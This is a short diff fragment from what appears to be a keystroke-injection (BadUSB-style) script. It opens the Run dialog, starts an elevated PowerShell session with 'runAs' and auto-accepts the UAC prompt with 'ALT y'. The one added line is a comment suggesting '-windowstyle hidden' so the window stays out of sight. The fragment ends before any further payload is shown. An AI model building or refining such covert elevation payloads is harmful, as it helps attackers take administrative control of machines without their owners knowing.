@@ -10,6 +10,7 @@ GUI r
 DELAY 200
 REM my best attempt at a elevated powershell instance
 STRING powershell Start-Process powershell -Verb runAs
+REM when working use "-windowstyle hidden" as well
 ENTER
 DELAY 1000
 ALT y
